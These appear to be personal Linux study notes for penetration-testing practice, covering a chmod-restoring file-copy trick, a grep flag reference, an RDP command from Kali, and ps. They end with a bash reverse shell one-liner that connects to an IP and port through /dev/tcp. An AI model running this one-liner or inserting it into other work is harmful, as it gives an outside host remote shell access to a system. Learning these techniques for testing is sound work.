# Linux Commands that could be helpful

# can show how to bypass file permissions if you dont have access to run chmod on target computer.
- locate universal.ovpn  - locate [filename] - show path to the file specified.
- ls -l newfilename.txt -  ls -l [optionalfilename] - will give us file permissions or list of the files in dir with permissions listed.
- cp /usr/bin/ls chmodfix - cp [filename] [newfilename] - will copy contents of first file to new one specified.
- cat /usr/bin/chmod > chmodfix - cat [filename] > [newfilename(exsisting)] - will take contents of one file and put it into a new file.
- when in doubt, if you know password/credentials use sudo

# 🔍 `grep` Quick Reference Guide  

## 📌 What is `grep`?  
`grep` (Global Regular Expression Print) is a command-line tool for searching **patterns in text files or outputs**. It supports **regular expressions, recursive searches, and filtering**. Commonly used for **log analysis, file searching, and security investigations**.

---

## 📊 Most Popular `grep` Flags  

| Flag        | Description | Usage Example |
|------------|-------------|--------------|
| `-i`       | Case-insensitive search | `grep -i "error" logfile.txt` |
| `-v`       | Invert match (exclude results) | `grep -v "root" /etc/passwd` |
| `-r`       | Recursive search in directories | `grep -r "password" /home/user/` |
| `-l`       | Show filenames only (hide matching lines) | `grep -l "admin" *.txt` |
| `-n`       | Show line numbers of matches | `grep -n "404" access.log` |
| `-w`       | Match whole words only | `grep -w "user" auth.log` |
| `-c`       | Count occurrences of the pattern | `grep -c "fail" syslog` |
| `-o`       | Show only the matching part of the line | `grep -o "[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+" logs.txt` |
| `-E`       | Use **extended** regex (same as `egrep`) | `grep -E "error|fail|warning" syslog` |
| `-A <n>`   | Show **n** lines **after** a match | `grep -A 3 "error" logs.txt` |
| `-B <n>`   | Show **n** lines **before** a match | `grep -B 3 "failure" logs.txt` |
| `-C <n>`   | Show **n** lines **before & after** a match | `grep -C 2 "unauthorized" logs.txt` |

---

## 🚀 Quick Usage Examples  

- **Find "root" case-insensitively in `/etc/passwd`**  

```
 grep -i "root" /etc/passwd
```
 

Connect to windows(rdp) from kali:
```
xfreerdp /u:<username> /p:<password> /v:<ip>
```

shows what is running on linux system:
```
ps
```

reverse shell one liner:
```
bash -c 'bash -i >& /dev/tcp/192.168.45.230/4444 0>&1'
url encoded:

```

